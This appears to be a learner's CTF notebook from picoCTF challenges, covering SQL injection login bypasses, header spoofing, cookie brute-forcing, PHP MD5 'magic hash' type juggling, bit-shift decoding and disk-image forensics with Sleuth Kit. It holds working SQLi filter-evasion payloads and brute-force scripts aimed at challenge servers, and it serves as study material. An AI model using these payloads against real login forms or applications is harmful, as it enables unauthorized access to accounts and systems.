Find all instances of a text line files in current and all subdirectories

grep -r "test"


## SQL injection (sqlite)

`SELECT * FROM user WHERE username='<u>' AND password='<p>'`

Task is to login as admin (known username as `admin`) with the following restriction:

1. `or`
u: admin' --
p: (doesn't matter because commented out with --)

2. `or` `and` `like` `=` `--`

u: admin'; #
p: (doesn't matter because commented out with #)

3. `or` `and` `=` `like` `>` `<` `--` (I suspect also `#`)

u: admin';
p: (doesn't matter because statement has been ended)

4 `or` `and` `=` `like` `>` `<` `--` `admin` + common filters (whitespace!)

my idea: concat!

u: ad'||'min';
p: (doesn't matter because statement has ended)

alternative:

u: ad/\*\*/min';  (`ad/**/min';`)

u: blah'/\*\*/union/\*\*/select/\*\*/*/\*\*/from/\*\*/users/\*\*/limit/\*\*/1;
(`blah'/*\*/union/**/select/**/*/**/from/**/users/**/limit/**/1;`)

5. `or` `and` `=` `like` `>` `<` `--` `admin` `union` + common filters (whitespace!)

All Filters:

```php
<?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}
?>
```

## User-Agent control ##

one challenge in picoCTF has you click a button `flag` (leading to the `/flag` page) but clicking it gives "you're not picobrowser! 


I've seen this before, the referrer is what they're asking about. Here's the raw curl request:

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Mobile Safari/537.36' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-User: ?1' \
  -H 'Sec-Fetch-Dest: document' \
  -H 'Referer: https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'Accept-Language: en-US,en;q=0.9,fr;q=0.8,es;q=0.7' \
  -H 'Cookie: PHPSESSID=rinmbr5fv8gekg81vitj13cj5s' \
  --compressed
```
Deleting all the unnecessary garbage and changing the user-agent:

```bash
curl 'https://jupiter.challenges.picoctf.org/problem/28921/flag' \
  -H 'User-Agent: picobrowser' \
```

Full disclosure: I thought at first it was the referrer, but that's involved with redirects. Random facts which may be useful. Whenever your security doesn't change or is upgraded (HTTP -> HTTP, HTTPS -> HTTPS, HTTP -> HTTPS) a referrer is tagged on. But whenever you downgrade (HTTPS -> HTTP) referrer comes back as empty. Another use for changing the user-agent is to have the interface change as if you were a mobile device (useful as a developer for sure)


Get header info with curl:

`curl -I http://mercury.picoctf.net:47967/`

brute force a cookie
```bash
for f in {1..100}
do
        echo $f
curl --silent 'http://mercury.picoctf.net:27177/check' \
  -H "Cookie: name=$f" | grep "pico"
done
```

Apache Server 

The configuration file is `.htaccess`, searching for it in the url may be helpful. If the host machine is a Mac, a `.DS_Store` may also be available. This file typically stores custom attributes (background image, icon position, etc.) This is similar to Windows' `desktop.ini`.

AES-CBC

AES-CBC (cipher block chain) is vulnerable to bit flipping attacks. Given a page which is encrypted (with an unknown key)

md5 collision

Related to the birthday paradox, I came across a challenge where you must upload two pdf files which have the same md5 hash, but they differ. Presumably php hashes both files and checks their equality. I remember hearing that md5 is broken, so I assumed that meant it was easy/quick to break, so I set off at first by creating a file then continuing to make new files and seeing if they have the same hash as the first. 

```python
#make_pdf.py
from fpdf import FPDF
import sys


infile = sys.argv[1]
outfile = sys.argv[2]

pdf = FPDF()
pdf.add_page()
pdf.set_font("Arial", size=15)
with open(infile,'r') as f:
    for x in f:
        pdf.cell(200, 10, txt=x, ln=1, align='C')

pdf.output(outfile)
```
```bash
f1=$(md5sum file1.pdf | cut -f1 -d' ')
f2=$(md5sum file2.pdf | cut -f1 -d' ')
while [ $f1 != $f2 ]
do
        #/usr/bin/python3 make_pdf.py file1.txt file1.pdf & chmod a+r file1.pdf
        /usr/bin/python3 make_pdf.py file2.txt file2.pdf & chmod a+r file2.pdf
        f1=$(md5sum file1.pdf | cut -f1 -d' ')
        f2=$(md5sum file2.pdf | cut -f1 -d' ')
        echo "$f1 $f2"
        sleep 0.9
        if [ "$f1" == "$f2" ]
                then echo "they're equal"
        fi
done
```
Why is there a sleep for almost a second? Because I've observed that the time of creation of the pdf file contributes to the hash. In my initial tests, without sleeping, I was seeing multiple rows that were the same.

Needless to say, this didn't progress quickly. I realized this isn't taking advantage of the birthday paradox. The reason it's a paradox is because we initially think "it's unlikely there will be someone else with my same birthday". -- but that's not what the paradox is about. It's about the likelihood of ANY 2 people having the same birthday. So it's like sampling without replacement. So I wrote a python script that would generate the files, hash it, then store the hash as a dictionary key (value being the file name). In this iteration I also "cut out the middleman" by not creating text files, and those textfiles into a pdf. 

```python
#makepdfs.py
def make_pdf(i,outfile):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=15)
    pdf.cell(200, 10, txt=str(i), ln=1, align='C')
    pdf.output(outfile)

checksums = {}
i = 0
while i<100:
    outfile = f'pdfs/{i}.pdf'
    make_pdf(i,outfile)
    with open(outfile, 'rb') as f:
        data = f.read()
        checksum = md5(data).hexdigest()
        if checksum in checksums:
            print(f'collision found! "{checksum}" for {i} and {checksums[checksum]}')
```
This went much more quickly, generation millions of files in a few minutes.... but of course that took up a lot of space and started to slow things down.

I then started looking for hints and I saw "how would php compare two files?" (the answer being potentially with `==` which checks equality AFTER typechecking. For example, with type checking, `1 == TRUE` is true. To avoid type checking and actually check equality, you must us `===`. Here, `1 === 1` is true, but `1 === TRUE` is false. Further investigation online led me to the concept of magic hashes. i.e. hashes of the form `0e(+only digits)`. This, after type checking resolves to zero raised to the power of a number, which is zero. So I then created this python script to try and create such files

```python
from fpdf import FPDF
from hashlib import md5
import re
import os

def make_pdf(i,outfile):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=15)
    pdf.cell(200, 10, txt=str(i), ln=1, align='C')
    pdf.output(outfile)

collisions = []
integers = []
i = 0
while len(collisions) < 2:
    outfile = f'pdfs/{i}.pdf'
    make_pdf(i,outfile)
    with open(outfile, 'rb') as f:
        data = f.read()
        checksum = md5(data).hexdigest()
        if re.match(r'0e\d+\b',checksum):
            collisions.append(checksum)
            integers.append(i)
            print(f'zero found! "{checksum}" for {i}')
        else:
            os.remove(outfile)

    i +=1
```
It ran for 7 hours without finding anything. Then I calculated the odds of finding ONE hash in the form I want is about 3 in a billion. I had in those 8 hours created and checked 100 million files. I was one thousandth of the way there and estimated 2.3 years before I would find on number.

I already found a list of magic hashes, for example: `240610708:0e462097431906509019562988736854`, when I tested them out, I found that `echo "240610708" | md5sum` DID NOT give the magic hash, or anything remotely similar. But then I found that `echo -n "240610708" | md5sum` did. It's all about removing that newline character. I also found out with just a text file, it's the contents and nothing else that is hashed (probably it's bytes) so I could also do `echo "240610708" | md5sum > file.txt`, then boom, I have such a file which hashes. I figured the fil creation step was slowing me down quite a bit, so I could just search for the hashes first and THEN create the files. From the list I found, I know that there are many hashes of capital letters of 8 digits which give magic hashes. 8 digits is not that much so I can brute force it. Rather than grabbing the posted items, I really want to generate them. So this gives me two such hashes in less than 30 mins:

```python
from hashlib import md5
import itertools
import re
import sys
import os

letters = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ')

collisions = []
guesses = []
for i in range(8):
    for guess in itertools.product(letters, repeat=i):
        guess = ''.join(guess)
        checksum = md5(guess.encode()).hexdigest()
        if re.match(r'0e\d+\b',checksum):
            collisions.append(checksum)
            guesses.append(guess)
            print(guess, checksum)
            if len(collisions) >= 2:
                sys.exit(0)

# output:
# ABJIHVY 0e755264355178451322893275696586
# DQWRASX 0e742373665639232907775599582643
```
From the list I saw there was an entry like:
`BRTKUJZ:00e57640477961333848717747276704` which means I could have expanded my regex to include any number of leading 0's followed by an e followed by a number. Regardless, this was the ultimate php managing script. Fortunately just renaming a text file .php is sufficient to trick that.

```php
<?php

if (isset($_POST["submit"])) {
    $type1 = $_FILES["file1"]["type"];
    $type2 = $_FILES["file2"]["type"];
    $size1 = $_FILES["file1"]["size"];
    $size2 = $_FILES["file2"]["size"];
    $SIZE_LIMIT = 18 * 1024;

    if (($size1 < $SIZE_LIMIT) && ($size2 < $SIZE_LIMIT)) {
        if (($type1 == "application/pdf") && ($type2 == "application/pdf")) {
            $contents1 = file_get_contents($_FILES["file1"]["tmp_name"]);
            $contents2 = file_get_contents($_FILES["file2"]["tmp_name"]);

            if ($contents1 != $contents2) {
                if (md5_file($_FILES["file1"]["tmp_name"]) == md5_file($_FILES["file2"]["tmp_name"])) {
                    highlight_file("index.php");
                    die();
                } else {
                    echo "MD5 hashes do not match!";
                    die();
                }
            } else {
                echo "Files are not different!";
                die();
            }
        } else {
            echo "Not a PDF!";
            die();
        }
    } else {
        echo "File too large!";
        die();
    }
}
?>
```

curl headers

I've already worked on puzzles with referrers, but there are other headers like DNT (do not track) and setting the ip address of the request (though it doesn't seem to ACTUALLY hide it, as this command still tells me I'm in the US `curl -H "X-Forwarded-For: 2.16.66.0" ipinfo.io`

```bash
curl -v 'http://mercury.picoctf.net:38322/' \
        -H 'User-Agent: PicoBrowser' \
        -H 'Referer: mercury.picoctf.net:38322' \
        -H "Date: Jan 12 2018" \
        -H "DNT: 1" \
        -H "X-Forwarded-For: 2.16.66.0" \
        -H "Accept-Language: sv"
```

## Binary and reverse engineering
I've never been to keen on binary / bit operators. The `^`, `<<` and `>>` commands in python were kind of mysteries to me and not ever something I found relevant. But here's a 2021 challenge that required their use. A file called `enc` included the following string

`灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥㜰㍢㐸㙽`

but also provided was the python one liner

`''.join([chr((ord(words[i]) << 8) + ord(words[i + 1])) for i in range(0, len(words), 2)])`

Clearly every two characters of the (I assumed just ascii-containing) plaintext was taken. The first of each pair (1st, 3rd, 5th, etc) was shifted 8 bits to the left adding a 0 pad to the right-end and the 2nd of each pair (2nd, 4th, 6th, etc) are just added as is. Each ASCII character is only 8 bits, so this ensures the two characters remain independent. So the left end of each pair can be recovered by bit shifting to the right. The right end can be recovered using bitwise logic. But as I have no practice with working at this level, it took a bit to figure out. It's easy to visualize though. For instance if the original first characters are `{P` which is decimal `123` and `80` or binary `01111011` and `01010000` (quick way to check in bash: `echo "obase=2;123"`). Then stacked and added, these become:

`0111101100000000` ( `{` )

`0000000001010000` ( `P` )

`0111101101010000` (`筐` from the number 31568)

So I can clearly just get the original right-most by performing and "and" operation with `0000000011111111` Because (0 and X) = 0 , (1 and X) is X

`0111101101010000`

`0000000011111111`&

`0000000001010000`

The following python code works (once the string is read from file into a `word` variable
```python3
decrypted_L = []
decrypted_R = []
for c in word:
        shifted = chr(ord(c) >> 8)
        decrypted_L.append(shifted)
        decrypted_R.append(chr(ord(c) & 0b11111111  ))

print(''.join(decrypted_L[i]+decrypted_R[i] for i in range(len(decrypted_L))))
```
Not sure if there's a sleeker one liner I can do, but this is sufficient

## Forensics
To be clear, I have very little understanding of how this works, but I'm keeping notes of what I learned. One (easy) challenge provides a file called `flag2of2-final.pdf`. but when you call `file flag2of2-final.pdf` on it, it returns

`flag2of2-final.pdf: PNG image data, 50 x 50, 8-bit/color RGBA, non-interlaced`

Confusing. The thing telling us it's a png comes from the "[magic numbers](https://www.geeksforgeeks.org/working-with-magic-numbers-in-linux/)". The "magic numbers" of the png file show up at the front as `89 50 4e 47 0d 0a 1a 0a`. The first few lines of a hexdump gives:

```
$ hexdump flag2of2-final.pdf | head -n 2
0000000 5089 474e 0a0d 0a1a 0000 0d00 4849 5244
0000010 0000 3200 0000 3200 0608 0000 1e00 883f
```
There they are (although kinda reversed because probably something about little vs big endian which I don't remember). It's clearer if used the `xxd` tool:
```
t$ xxd flag2of2-final.pdf | head -n 2
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 0032 0000 0032 0806 0000 001e 3f88  ...2...2......?.
```
(not reversed because of...some reason). Down several lines of the xxd hex dump we can see:

```
00000380: 0f86 f099 66ec 0000 0000 4945 4e44 ae42  ....f.....IEND.B
00000390: 6082 2550 4446 2d31 2e34 0a25 c7ec 8fa2  `.%PDF-1.4.%....
000003a0: 0a25 2549 6e76 6f63 6174 696f 6e3a 2070  .%%Invocation: p
```
The `IEND` part has something to do with the end of the "png part". Finally exiftool also shows this warning:
```
$exiftool flag2of2-final.pdf
... stuff I've cut out...
Warning                         : [minor] Trailer data after PNG IEND chunk`
... stuff I've cut out...
```
So, copying the xxd hex dump from top to just before the `%PDF` portion into a new file (called `newf`) and reversing the xxd hexdump with `cat newf | xxd -r > backdata`, this backdata opens as a png giving the other portion.

### disk images
sleuthtools is a very useful utility (`sudo apt install sleuthkit`). It's not a tool itself but a collection of tools. There are different layers top to bottom is an image (img_) multimedia (mm), then file (f), then inode (i). And these each have some basic functions you're used to (cat, ls, stat), so combinations of these can usually be used to inspect the image and subparts (`img_stat`,`img_cat`,`mmls`,`mmcat`,`mmstat`,`fcat`,`fls`,`icat`,`ils`). There's also an `fsstat`, which is not a misspelling of `fstat` (<- non-existant) as well as other tools not metioned.

you can do a first pass inspection on a disk image with `img_stat <IMAGE_NAME>`. It ir return somthing that might look like:

```
IMAGE FILE INFORMATION
--------------------------------------------
Image Type: raw

Size in bytes: 104857600
Sector size:    512
```
given we know it's a raw image type, we can use another tool on it, `mmls`. 
```
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000204799   0000202752   Linux (0x83)
```
Important info here: We can see the start point of the partition we're interested in (2048). We also know it's a physical disk image as opposed to a logical disk image as mmls would cause an error because it wouldn't be able to parse out the partition table.

Now we can get general details of the file system information (location of inodes or index nodes which is a general 'nix system data structure for files and directories) at that offset using `fsstat` with the `-o` flag. With the example above: `fsstat -o 2048 <IMAGE_NAME>`. This really will inform us as to the existance of files and directories. From here we can list the files. Like `ls`, but that's already taken, so instead use the `fls` command. We again need to specify the offset so the command would be something like: `fls -o 2048 <IMAGE_NAME>`. 
```
d/d 15617:      home
d/d 11: lost+found
r/r 12: .dockerenv
d/d 21473:      bin
d/d 1953:       boot
d/d 13665:      dev
d/d 17569:      etc
d/d 3905:       lib
d/d 15618:      media
d/d 13669:      mnt
d/d 13670:      opt
d/d 13671:      proc
d/d 15622:      root
d/d 13672:      run
d/d 15623:      sbin
d/d 13673:      srv
d/d 15700:      sys
d/d 13674:      tmp
d/d 15701:      usr
d/d 13675:      var
V/V 25377:      $OrphanFiles
```
By default this lists everything from the root directory, we could for instance recursively list all subfiles and sub-directories with the `-r` flag (cannot follow delted dirs) or only show deleted files with the `-d` flag. From the output above, `d/d` is a directory. The number following it is the inode of the file/folder. We could look into just one by adding that inode after the file/directory listing (eg. to check out the root foler whichi s on inode 15622, do: `fls -o 2048 <IMAGE_NAME> 15622`)

We can recover the image using the sleuth kit recover `tsk_recover`:  `tsk_recover -o 206848 <IMAGE_NAME> <OUTPUT_FOLDER>/`  BUT this won't recover deleted (unallocated) files, so add the `-e` flag (for everything) somewhere in there. Alternatively, if you don't want to recover, instead continue to explore the image, you can use `icat` (i for inode). 

